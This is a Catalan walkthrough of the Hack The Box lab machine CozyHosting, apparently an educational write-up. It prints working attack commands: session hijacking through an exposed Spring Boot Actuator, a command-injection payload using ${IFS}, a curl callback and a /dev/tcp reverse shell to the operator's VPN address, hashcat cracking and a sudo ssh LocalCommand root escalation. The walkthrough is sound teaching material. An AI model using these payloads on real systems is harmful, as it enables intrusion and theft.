# HTB CozyHosting — Informe tècnic didàctic

## Índex

1. [Introducció del cas](#1-introducció-del-cas)
2. [Resum executiu tècnic](#2-resum-executiu-tècnic)
3. [Preparació i arrencada del laboratori](#3-preparació-i-arrencada-del-laboratori)
4. [Enumeració inicial de ports i serveis](#4-enumeració-inicial-de-ports-i-serveis)
5. [Identificació de la superfície dominant](#5-identificació-de-la-superfície-dominant)
6. [Enumeració web base](#6-enumeració-web-base)
7. [Login, errors de backend i transició cap a Spring Boot](#7-login-errors-de-backend-i-transició-cap-a-spring-boot)
8. [Descobriment de Spring Boot Actuator](#8-descobriment-de-spring-boot-actuator)
9. [Filtració de sessió i accés al dashboard](#9-filtració-de-sessió-i-accés-al-dashboard)
10. [Anàlisi del panell autenticat](#10-anàlisi-del-panell-autenticat)
11. [Validació del flux `/executessh`](#11-validació-del-flux-executessh)
12. [Command injection a `username`](#12-command-injection-a-username)
13. [Confirmació d’execució remota mitjançant callback](#13-confirmació-dexecució-remota-mitjançant-callback)
14. [Foothold: shell com a usuari `app`](#14-foothold-shell-com-a-usuari-app)
15. [Enumeració local i anàlisi del JAR](#15-enumeració-local-i-anàlisi-del-jar)
16. [Credencials PostgreSQL a `application.properties`](#16-credencials-postgresql-a-applicationproperties)
17. [Enumeració de PostgreSQL i extracció de hashes](#17-enumeració-de-postgresql-i-extracció-de-hashes)
18. [Crackeig del hash bcrypt](#18-crackeig-del-hash-bcrypt)
19. [Moviment lateral: accés SSH com a `josh`](#19-moviment-lateral-accés-ssh-com-a-josh)
20. [Escalada de privilegis: abús de `sudo ssh`](#20-escalada-de-privilegis-abús-de-sudo-ssh)
21. [Resum tècnic final](#21-resum-tècnic-final)
22. [Lliçons reutilitzables](#22-lliçons-reutilitzables)
23. [Correccions editorials aplicades](#23-correccions-editorials-aplicades)
24. [Annex A — Notes originals conservades](#24-annex-a--notes-originals-conservades)

---

## 1. Introducció del cas

CozyHosting és una màquina Linux de dificultat easy en què la cadena de compromís es basa en una aplicació web Spring Boot exposada incorrectament. La resolució no parteix de credencials vàlides obtingudes per força bruta ni d’un exploit públic directe, sinó d’una exposició indeguda d’endpoints de diagnòstic, una sessió activa filtrada i una funcionalitat autenticada que construeix una operació SSH de manera insegura.

El recorregut tècnic complet és especialment útil com a cas d’estudi perquè encadena diverses idees reutilitzables:

- reconeixement inicial amb superfície mínima;
- necessitat de resoldre un hostname virtual;
- detecció d’un backend dinàmic a partir d’errors JSON;
- exposició de Spring Boot Actuator;
- reutilització d’una sessió activa;
- separació entre interfície visual, petició HTTP real i backend;
- command injection autenticada;
- anàlisi d’un JAR Spring Boot;
- extracció de credencials de base de dades;
- crackeig offline de bcrypt;
- reutilització de contrasenya per SSH;
- abús d’una regla `sudoers` insegura.

La resolució queda documentada en dos nivells: primer, els fets verificats durant el laboratori; després, l’explicació didàctica que permet entendre per què cada pas era raonable i com condicionava la fase següent.

---

## 2. Resum executiu tècnic

### Cadena d’explotació

```text
Nmap detecta SSH i HTTP
→ HTTP redirigeix a cozyhosting.htb
→ s’afegeix el hostname a /etc/hosts
→ la web mostra /login i errors JSON
→ s’identifica un backend Spring Boot
→ /actuator queda exposat
→ /actuator/sessions revela una sessió de kanderson
→ es reutilitza JSESSIONID per accedir a /admin
→ el panell mostra un formulari POST /executessh
→ username participa en una crida SSH construïda per shell
→ command injection autenticada
→ un callback extern confirma execució remota
→ reverse shell com a app
→ /app conté cloudhosting-0.0.1.jar
→ application.properties revela credencials PostgreSQL
→ la base cozyhosting conté hashes bcrypt
→ es crackeja el hash d’admin com manchesterunited
→ la contrasenya es reutilitza per accedir per SSH com a josh
→ sudo -l permet /usr/bin/ssh * com a root
→ LocalCommand permet llançar /bin/bash com a root
```

### Resultat final

```text
Usuari inicial d’aplicació: app
Usuari lateral: josh
Usuari final: root
Host: cozyhosting
User flag: d2f307799472b53e63932cffbae92e2b
Root flag: edba58633595f327570a0c2683f14201
```

### Troballes principals

| Fase | Troballa dominant | Impacte |
|---|---|---|
| Enumeració inicial | HTTP redirigeix a `cozyhosting.htb` | Obliga a treballar per hostname |
| Web base | `/login` real i errors JSON | Indica backend dinàmic |
| Enumeració backend | Spring Boot Actuator exposat | Revela endpoints, mappings i sessions |
| Accés autenticat | Sessió `kanderson` filtrada | Permet entrar al dashboard |
| Panell | Formulari `POST /executessh` | Entrada controlable cap al backend SSH |
| Foothold | Command injection a `username` | Shell com a `app` |
| Local | Credencials PostgreSQL al JAR | Accés a la base `cozyhosting` |
| Credencials | Hash bcrypt d’`admin` crackejat | Contrasenya `manchesterunited` |
| Moviment lateral | Reutilització en l’usuari `josh` | SSH estable |
| Escalada | `sudo /usr/bin/ssh *` | Shell root mitjançant `LocalCommand` |

---

## 3. Preparació i arrencada del laboratori

La màquina es va iniciar amb l’script propi `Inici-HTB`, utilitzat per preparar l’estructura de treball i llançar una enumeració inicial controlada. Aquest script no fa explotació. El seu valor és deixar el cas organitzat des del principi, crear els directoris de treball, verificar connectivitat i generar evidències inicials.

### Comanda d’arrencada

```bash
Inici-HTB CozyHosting 10.129.37.233 easy
```

### Estructura de treball esperada

```text
CozyHosting/
├── content/
├── exploits/
├── nmap/
│   ├── allPorts
│   ├── extractPorts.txt
│   ├── nmap_tcp_services.txt
│   ├── ping.txt
│   └── whichSystem.txt
└── notes/
    ├── 00_resumen_inicial.md
    └── 01_siguiente_paso.txt
```

### Què es buscava en aquesta fase

La fase d’arrencada no intenta descobrir la vulnerabilitat principal. El seu objectiu és respondre preguntes bàsiques:

- si l’objectiu és viu;
- quins ports TCP són oberts;
- quins serveis i versions s’exposen;
- si hi ha un hostname o vhost rellevant;
- quina superfície sembla dominar el cas;
- quines branques han de quedar com a secundàries.

### Evidència observada

L’objectiu va respondre correctament a `ping`:

```text
1 packets transmitted, 1 received, 0% packet loss
64 bytes from 10.129.37.233: icmp_seq=1 ttl=63
```

La identificació ràpida va estimar Linux:

```text
10.129.37.233 (ttl -> 63): Linux
```

El TTL no s’ha de tractar com a prova absoluta, però combinat més endavant amb banners Ubuntu reforça la inferència de sistema Linux.

---

## 4. Enumeració inicial de ports i serveis

### Escaneig complet de ports

L’escaneig complet va detectar una superfície molt reduïda:

```text
22/tcp open  ssh
80/tcp open  http
```

### Fingerprint de serveis

L’escaneig de serveis va identificar:

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
http-title: Did not follow redirect to http://cozyhosting.htb
```

### Lectura del resultat

El port `22/tcp` queda anotat com a SSH disponible, però sense credencials encara no pot ser la branca principal. En canvi, el port `80/tcp` presenta una redirecció explícita cap a un hostname:

```text
http://cozyhosting.htb
```

Aquest detall condiciona tota l’enumeració posterior: si s’accedeix només per IP, l’aplicació pot respondre de manera incompleta o fora del context esperat.

### Decisió de fase

```text
Superfície dominant: HTTP
Branca principal: WEB-BASE
Branca secundària: SSH pendent de credencials
Següent pas únic: resoldre cozyhosting.htb localment i enumerar la web per domini
```

---

## 5. Identificació de la superfície dominant

La redirecció HTTP cap a `cozyhosting.htb` converteix el hostname en part de la superfície real. En molts laboratoris web, el nom virtual no és decoratiu: pot afectar rutes, sessions, cookies, redireccions i contingut servit.

### Resolució local del hostname

```bash
sudo sh -c 'echo "10.129.37.233 cozyhosting.htb" >> /etc/hosts'
getent hosts cozyhosting.htb
```

La resolució va quedar confirmada:

```text
10.129.37.233   cozyhosting.htb
```

A la sortida original apareixia duplicat, cosa que indica que probablement es va afegir dues vegades al fitxer `/etc/hosts`. No va afectar l’explotació, però queda com a detall operatiu corregible.

### Per què aquest pas importa

Abans de fer fuzzing de rutes o revisar el login, calia garantir que les eines consultaven l’aplicació tal com estava pensada. Si el servei HTTP redirigeix a un domini, aquest domini s’ha de resoldre localment per evitar lectures falses.

---

## 6. Enumeració web base

### Capçaleres inicials

```bash
curl -sS -I http://cozyhosting.htb
```

La web va respondre amb `200 OK`:

```text
HTTP/1.1 200
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html;charset=UTF-8
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

### HTML inicial

```bash
curl -sS http://cozyhosting.htb | head -n 60
```

Es va observar una landing pública:

```html
<title>Cozy Hosting - Home</title>
```

L’HTML incloïa una plantilla Bootstrap anomenada FlexStart i un enllaç visible a:

```text
/login
```

### Tecnologies visibles

```bash
whatweb http://cozyhosting.htb
```

La sortida va confirmar components esperables per a una web pública:

```text
Bootstrap
HTML5
nginx/1.18.0
Title[Cozy Hosting - Home]
Email[info@cozyhosting.htb]
```

### Rutes i referències extretes

```bash
curl -sS http://cozyhosting.htb | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
```

Entre els enllaços es va observar:

```text
/login
assets/css/style.css
assets/js/main.js
assets/vendor/bootstrap/...
```

La cerca de paraules clau també va detectar referències comercials a panells administratius:

```text
Login
admin
administrative dashboard
admin interface
```

### Interpretació

Les referències a “admin interface” dins de la landing no demostren per si soles un panell explotable. Poden ser text comercial. El senyal tècnic real és `/login`, perquè apunta a un flux d’autenticació concret.

### Error operatiu observat

La sortida va incloure:

```text
curl: (23) Failure writing output to destination
```

Això no era un error de l’objectiu. Apareix quan `curl` continua escrivint però `head` ja ha tancat la canonada. És un detall local de terminal i no s’ha d’interpretar com una troballa de la màquina.

---

## 7. Login, errors de backend i transició cap a Spring Boot

### Revisió de `/login`

```bash
curl -sS -I http://cozyhosting.htb/login
curl -sS http://cozyhosting.htb/login | head -n 80
```

La ruta va respondre amb `200 OK` i va mostrar un formulari real:

```html
<form action="/login" method="post" class="row g-3 needs-validation">
```

Els camps rellevants eren:

```text
username
password
remember
```

No es va observar cap camp CSRF visible a l’HTML. Aquest punt es va anotar com a característica del formulari, no com a vulnerabilitat demostrada.

### Revisió de `/error` i rutes inexistents

```bash
curl -sS -i http://cozyhosting.htb/error | head -n 80
curl -sS -i http://cozyhosting.htb/noexiste | head -n 80
```

La ruta `/error` va retornar JSON:

```json
{"timestamp":"2026-05-02T11:27:57.289+00:00","status":999,"error":"None"}
```

Una ruta inexistent també va retornar un JSON estructurat:

```json
{"timestamp":"2026-05-02T11:28:22.877+00:00","status":404,"error":"Not Found","path":"/noexiste"}
```

### Lectura didàctica

L’aplicació no era una web estàtica pura servida per nginx. Encara que nginx actuava com a frontal, els errors JSON indicaven que hi havia un backend dinàmic processant rutes i errors. La combinació de formulari POST, capçaleres de seguretat i format d’error amb `timestamp`, `status`, `error` i `path` era compatible amb una aplicació Java/Spring.

### Decisió

```text
Branca principal: WEB-BASE, amb transició probable a WEB-AUTH / PANEL
Motiu: /login real + errors JSON de backend
Següent pas: enumerar rutes backend i endpoints típics de Spring Boot
```

---

## 8. Descobriment de Spring Boot Actuator

### Fuzzing comú

```bash
ffuf -u http://cozyhosting.htb/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all -fc 404
```

Rutes rellevants:

```text
admin     401
error     500
index     200
login     200
logout    204
```

### Fuzzing específic de Spring Boot

```bash
ffuf -u http://cozyhosting.htb/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt \
  -mc all -fc 404
```

Endpoints rellevants:

```text
actuator              200
actuator/sessions     200
actuator/env          200
actuator/mappings     200
actuator/health       200
actuator/beans        200
```

### Confirmació de l’endpoint base

```bash
curl -sS -i http://cozyhosting.htb/actuator | head -n 80
```

L’endpoint va retornar enllaços interns:

```text
/actuator/sessions
/actuator/beans
/actuator/health
/actuator/env
/actuator/mappings
```

El health check va confirmar que l’aplicació estava aixecada:

```bash
curl -sS http://cozyhosting.htb/actuator/health
```

```json
{"status":"UP"}
```

### Interpretació

Spring Boot Actuator és una superfície de diagnòstic. En un desplegament segur, no hauria d’exposar endpoints sensibles a usuaris anònims. En aquest cas, l’exposició de `sessions`, `mappings`, `env` i `beans` era la troballa dominant: ja no es tractava només de trobar rutes, sinó de llegir informació interna del backend.

---

## 9. Filtració de sessió i accés al dashboard

### Enumeració de mappings

```bash
curl -sS http://cozyhosting.htb/actuator/mappings
```

Entre les rutes internes va aparèixer una especialment important:

```text
POST /executessh
```

Associada al handler:

```text
htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)
```

També es van confirmar vistes internes:

```text
/admin
/addhost
/index
/login
```

### Filtració de sessions

```bash
curl -sS http://cozyhosting.htb/actuator/sessions
```

Una de les respostes observades va ser:

```json
{
  "7973024D4ACF933A79FFF0AC267E833A": "UNAUTHORIZED",
  "69EF63EAAED85BD239B2A03AFE4B7D29": "kanderson"
}
```

La sessió marcada com a `UNAUTHORIZED` no era útil. La rellevant era l’associada a:

```text
kanderson
```

### Validació per terminal

```bash
curl -sS -i http://cozyhosting.htb/admin \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' | head -n 120
```

La resposta va ser `200 OK` i va mostrar el dashboard:

```html
<title>Dashboard - Cozy Cloud</title>
<span class="d-none d-md-block ps-2">K. Anderson</span>
```

### Accés des del navegador

Més endavant, la sessió inicial va caducar i calgué obtenir-ne una de nova mitjançant `/actuator/sessions`:

```json
{
  "C42BC31D847B65FA25FE4A4AB541318E": "UNAUTHORIZED",
  "1129638E080FFCADC2EDD2B617160C46": "UNAUTHORIZED",
  "405F6C1B7D933B6BE1F873BBB79023ED": "UNAUTHORIZED",
  "45CE26F0AAE9695F22A16A62957B9B9B": "kanderson"
}
```

La cookie vàlida es va verificar per terminal:

```bash
curl -sS -i http://cozyhosting.htb/admin \
  -H 'Cookie: JSESSIONID=45CE26F0AAE9695F22A16A62957B9B9B' | head -n 20
```

El codi esperat era:

```text
HTTP/1.1 200
```

Per entrar al navegador, es va esborrar la cookie `JSESSIONID` existent des de:

```text
Eines de desenvolupament → Emmagatzematge → Cookies → http://cozyhosting.htb
```

I se’n va crear una de nova:

```text
Nom: JSESSIONID
Valor: 45CE26F0AAE9695F22A16A62957B9B9B
Domini: cozyhosting.htb
Ruta: /
```

Després es va navegar directament a:

```text
http://cozyhosting.htb/admin
```

No s’havia de prémer Login ni introduir credencials: l’accés depenia de reutilitzar la sessió filtrada.

### Lliçó d’aquesta fase

El punt clau no era “tenir un nom d’usuari”, sinó una sessió activa vàlida. `kanderson` com a text no obria el panell; el valor de `JSESSIONID` associat a `kanderson` sí que permetia accedir al dashboard.

---

## 10. Anàlisi del panell autenticat

Després d’accedir a `/admin`, es va desar l’HTML complet per fer-ne una anàlisi local:

```bash
mkdir -p loot
curl -sS http://cozyhosting.htb/admin \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -o loot/admin_kanderson.html
```

### Evidència observada

El panell mostrava:

```text
Dashboard - Cozy Cloud
K. Anderson
Admin Dashboard
Keep your hosts patched!
```

La secció rellevant era:

```text
Include host into automatic patching
```

L’HTML contenia:

```html
<form action="/executessh" method="post">
<input name="host" class="form-control" id="host" placeholder="example.com">
<input name="username" class="form-control" id="username" placeholder="user">
```

El mateix panell explicava que Cozy Scanner intentava connectar-se al host del client utilitzant una clau privada:

```text
For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorised_keys file.
```

### Interpretació

La interfície visual, la petició real i el backend quedaven connectats:

```text
Dashboard autenticat
→ formulari “Include host into automatic patching”
→ POST /executessh
→ ComplianceService#executeOverSsh
→ operació SSH des del servidor
```

Aquest pas era essencial. No n’hi havia prou amb saber que `/executessh` existia a `mappings`; calia observar com s’invocava des del panell i quins paràmetres controlava l’usuari.

---

## 11. Validació del flux `/executessh`

Abans de provar caràcters especials, es va validar el comportament normal del formulari amb entrades benignes.

### Prova amb localhost

```bash
curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test' \
  -o loot/executessh_test_127001.txt
```

Resultat clau:

```text
Location: http://cozyhosting.htb/admin?error=Host key verification failed.
```

### Prova amb domini extern

```bash
curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=example.com' \
  --data-urlencode 'username=test' \
  -o loot/executessh_test_example.txt
```

Resultat clau:

```text
Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname example.com: Temporary failure in name resolution
```

### Què demostra aquesta diferència

El backend no estava retornant un error genèric de formulari. Els errors eren compatibles amb una execució real del client SSH:

- `127.0.0.1` resolia i arribava a la fase de verificació de clau de host;
- `example.com` fallava en la resolució DNS des del servidor.

Per tant, el paràmetre `host` arribava a una operació SSH real.

### Validació de restriccions d’entrada

Es van provar entrades per entendre què validava l’aplicació:

```bash
curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=invalid host' \
  --data-urlencode 'username=test'
```

Resultat:

```text
Invalid hostname!
```

Amb un espai a `username`:

```bash
curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test user'
```

Resultat:

```text
Username can't contain whitespaces!
```

### Lectura

El camp `host` tenia una validació de format. El camp `username` bloquejava espais literals, però continuava sent interessant perquè participava en la construcció de l’operació SSH.

---

## 12. Command injection a `username`

### Proves amb caràcters especials

Es va provar `username=test;`:

```bash
curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test;'
```

Resultat rellevant:

```text
/bin/bash: line 1: @127.0.0.1: command not found
```

També es va provar `username=test|`:

```text
/bin/bash: line 1: @127.0.0.1: command not found
```

L’aparició de `/bin/bash: line 1` va confirmar que el valor de `username` arribava a una shell del sistema. El backend no invocava SSH de manera segura amb arguments separats; construïa una cadena interpretada per shell.

### Comprensió de la posició del paràmetre

En provar:

```text
username=test;id
```

la resposta va ser:

```text
/bin/bash: line 1: id@127.0.0.1: command not found
```

La sortida no era la d’`id`, perquè l’ordre injectada quedava contaminada pel sufix `@host`. Això va permetre inferir que l’aplicació construïa alguna cosa semblant a:

```text
ssh <username>@<host>
```

En injectar a `username`, tot el que s’afegeix queda abans de `@127.0.0.1` si no es talla la resta de la línia.

### Ús de comentari per neutralitzar el sufix

Es va provar:

```text
username=test;id;#
```

L’error relacionat amb `@127.0.0.1` va desaparèixer. Això va confirmar que `#` actuava com a comentari de shell i tallava la resta de la línia.

### Lliçó tècnica

En command injection no n’hi ha prou amb comprovar que un separador funciona. Cal entendre on cau exactament el paràmetre dins de l’ordre final. Aquí la injecció era real, però el sufix `@host` afectava les ordres si no es neutralitzava.

---

## 13. Confirmació d’execució remota mitjançant callback

Com que la sortida d’ordres no sempre es reflectia de manera neta en la resposta HTTP, es va validar l’execució amb un callback extern.

### Obtenir la IP de la interfície VPN

```bash
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
```

Resultat:

```text
10.10.15.26
```

### Terminal 1: servidor HTTP

```bash
cd /home/r4mon/pentest/targets/HTB/easy/CozyHosting
python3 -m http.server 7000
```

### Petició de prova

```bash
curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test;curl${IFS}http://10.10.15.26:7000;#' \
  -o loot/executessh_callback_curl.txt
```

### Senyal d’èxit

Al servidor HTTP local es va rebre:

```text
10.129.37.233 - - [02/May/2026 16:56:55] "GET / HTTP/1.1" 200 -
```

La IP `10.129.37.233` era la víctima. Això confirmava que la màquina objectiu va iniciar una connexió sortint cap al servidor controlat per l’operador.

### Per què `${IFS}` era necessari

L’aplicació bloquejava espais literals a `username`. `${IFS}` permet introduir separació interpretable per shell sense usar un espai literal. Aquesta substitució va ser clau per construir ordres amb arguments.

---

## 14. Foothold: shell com a usuari `app`

### Preparació de `rev.sh`

Al mateix directori utilitzat per al servidor HTTP es va preparar el fitxer `rev.sh`:

```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.15.26/4444 0>&1' > rev.sh
chmod +x rev.sh
```

### Terminal 1: servidor HTTP

```bash
cd /home/r4mon/pentest/targets/HTB/easy/CozyHosting
python3 -m http.server 7000
```

### Terminal 2: listener

```bash
nc -lvnp 4444
```

### Navegador: formulari autenticat

Al panell:

```text
http://cozyhosting.htb/admin
```

A la secció:

```text
Include host into automatic patching
```

Es va emplenar:

```text
Hostname: 127.0.0.1
Username: payload preparat per descarregar i executar rev.sh
```

El payload es va introduir únicament al camp `Username` del formulari web. No s’havia d’executar en una terminal local ni escriure al listener.

### Error operatiu evitat

Si el servidor HTTP mostra:

```text
GET /rev.sh HTTP/1.1" 404 -
```

vol dir que `rev.sh` no és al directori des del qual s’ha aixecat `python3 -m http.server 7000`. És un error local, no de l’objectiu.

### Recepció de shell

El listener va rebre:

```text
connect to [10.10.15.26] from (UNKNOWN) [10.129.37.233] 48724
sh: 0: can't access tty; job control turned off
```

La shell es va validar amb:

```bash
whoami
hostname
ls
```

Resultat:

```text
app
cozyhosting
cloudhosting-0.0.1.jar
```

### Confirmació del context

L’origen `10.129.37.233` i el resultat `whoami=app`, `hostname=cozyhosting` confirmaven que la shell era de la màquina objectiu.

Un error anterior va produir una connexió des de la mateixa IP atacant i va mostrar `whoami=r4mon`, `hostname=parrot`. Aquell cas no era una shell vàlida de CozyHosting, sinó una execució local accidental.

---

## 15. Enumeració local i anàlisi del JAR

### Millora mínima de la shell

```bash
script /dev/null -c bash
export TERM=xterm
```

### Confirmació de context

```bash
pwd
ls -la
ls -lh cloudhosting-0.0.1.jar
```

Resultat:

```text
/app
-rw-r--r-- 1 root root 58M Aug 11  2023 cloudhosting-0.0.1.jar
```

### Extracció del JAR

```bash
mkdir -p /tmp/cozy_jar
unzip -q cloudhosting-0.0.1.jar -d /tmp/cozy_jar
```

La primera vegada es va cometre un error d’escriptura (`nzip`), corregit immediatament amb `unzip`.

### Estructura rellevant

```bash
find /tmp/cozy_jar -maxdepth 3 -type f | sort | head -n 80
```

Va aparèixer:

```text
/tmp/cozy_jar/BOOT-INF/classes/application.properties
/tmp/cozy_jar/BOOT-INF/lib/postgresql-42.5.1.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-boot-3.0.2.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-boot-actuator-3.0.2.jar
```

### Cerca de fitxers de configuració

```bash
find /tmp/cozy_jar -type f \( -name "*.properties" -o -name "*.yml" -o -name "*.yaml" -o -name "*.xml" \) -print
```

Resultat:

```text
/tmp/cozy_jar/BOOT-INF/classes/application.properties
/tmp/cozy_jar/META-INF/maven/htb.cloudhosting/cloudhosting/pom.xml
/tmp/cozy_jar/META-INF/maven/htb.cloudhosting/cloudhosting/pom.properties
```

### Lliçó sobre cerques massa àmplies

L’ordre:

```bash
grep -RniE 'spring.datasource|jdbc|postgres|password|username|user|secret|token|key' /tmp/cozy_jar 2>/dev/null
```

produïa massa sortida perquè recorria també `/tmp/cozy_jar/BOOT-INF/lib/`, on hi ha llibreries amb moltes cadenes coincidents. La forma més útil era acotar a:

```bash
grep -RniE 'spring.datasource|jdbc|postgres|password|username|secret|token|key' \
  /tmp/cozy_jar/BOOT-INF/classes 2>/dev/null
```

---

## 16. Credencials PostgreSQL a `application.properties`

### Revisió del fitxer

```bash
cat /tmp/cozy_jar/BOOT-INF/classes/application.properties
```

Contingut rellevant:

```properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

### Fets verificats

```text
Base de dades: cozyhosting
Host: localhost
Port: 5432
Usuari: postgres
Contrasenya: Vg&nvzAQ7XxR
```

### Interpretació

El JAR no era només un artefacte de desplegament; contenia configuració sensible. En aplicacions Spring Boot, `application.properties` és un objectiu prioritari després d’obtenir shell perquè sovint emmagatzema paràmetres de connexió, endpoints exposats i secrets operatius.

Aquesta troballa va canviar la branca activa cap a credencials i base de dades local.

---

## 17. Enumeració de PostgreSQL i extracció de hashes

### Connexió no interactiva

Per evitar problemes amb el paginador de `psql` en una shell inestable, es van utilitzar consultes no interactives amb el paginador desactivat.

```bash
PGPASSWORD='Vg&nvzAQ7XxR' psql -h 127.0.0.1 -U postgres -d cozyhosting -P pager=off -c '\dt'
```

Resultat:

```text
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
```

### Consulta d’usuaris

```bash
PGPASSWORD='Vg&nvzAQ7XxR' psql -h 127.0.0.1 -U postgres -d cozyhosting -P pager=off -c 'SELECT * FROM users;'
```

Resultat:

```text
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

### Lectura del resultat

El format `$2a$10$...` correspon a bcrypt. L’usuari `admin` era el candidat prioritari perquè tenia rol `Admin` dins de l’aplicació.

La contrasenya d’aplicació d’`admin` no s’havia d’assumir automàticament com a contrasenya de sistema. Primer calia crackejar el hash i després comprovar si la contrasenya estava reutilitzada per algun usuari local real.

---

## 18. Crackeig del hash bcrypt

### Preparació del hash

A la màquina atacant:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/CozyHosting/exploits

cat > admin_hash.txt << 'EOF'
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
EOF
```

### Crackeig amb Hashcat

```bash
hashcat -m 3200 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

Resultat rellevant:

```text
Status: Cracked
Hash.Mode: 3200 (bcrypt $2*$, Blowfish (Unix))
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

### Resultat de credencials

```text
Usuari d’aplicació: admin
Hash: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
Contrasenya: manchesterunited
```

### Interpretació

El crackeig va transformar un secret d’aplicació en una contrasenya en clar. El pas correcte següent era buscar usuaris locals reals i comprovar reutilització, no intentar iniciar sessió per SSH com a `admin` sense evidència que aquest usuari existís a Linux.

---

## 19. Moviment lateral: accés SSH com a `josh`

### Revisió d’usuaris locals

Des de la shell com a `app`:

```bash
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
```

Usuaris rellevants:

```text
root:x:0:0:root:/root:/bin/bash
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
```

L’usuari local `josh` era un candidat real per provar la reutilització de la contrasenya crackejada.

### Accés SSH

Des de la màquina atacant:

```bash
ssh josh@10.129.37.233
```

Contrasenya utilitzada:

```text
manchesterunited
```

L’accés va ser satisfactori. El context va quedar validat:

```bash
whoami
id
hostname
pwd
```

Resultat:

```text
josh
uid=1003(josh) gid=1003(josh) groups=1003(josh)
cozyhosting
/home/josh
```

### User flag

```bash
cat /home/josh/user.txt
```

Resultat:

```text
d2f307799472b53e63932cffbae92e2b
```

### Lectura didàctica

Aquest pas demostra per què cal provar reutilització entre superfícies. El hash pertanyia a un usuari d’aplicació anomenat `admin`, però la contrasenya resultant va funcionar per a un usuari local diferent: `josh`.

---

## 20. Escalada de privilegis: abús de `sudo ssh`

### Revisió de permisos sudo

```bash
sudo -l
```

Resultat:

```text
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

### Interpretació

La línia:

```text
(root) /usr/bin/ssh *
```

vol dir que `josh` pot executar `/usr/bin/ssh` com a `root` i amb arguments arbitraris. Això és perillós perquè `ssh` no només obre connexions: també permet opcions de client que executen ordres locals després d’establir una connexió.

L’opció rellevant és:

```text
LocalCommand
```

Perquè s’executi, cal habilitar:

```text
PermitLocalCommand=yes
```

En executar el client SSH mitjançant `sudo`, l’ordre definida a `LocalCommand` hereta el context de `root`.

### Comanda d’escalada

```bash
sudo /usr/bin/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127.0.0.1
```

Es va acceptar l’empremta SSH de `127.0.0.1` i es va introduir la contrasenya de `josh`.

### Validació de root

```bash
whoami
id
hostname
pwd
```

Resultat:

```text
root
uid=0(root) gid=0(root) groups=0(root)
cozyhosting
/home/josh
```

### Root flag

```bash
cat /root/root.txt
```

Resultat:

```text
edba58633595f327570a0c2683f14201
```

### Lectura didàctica

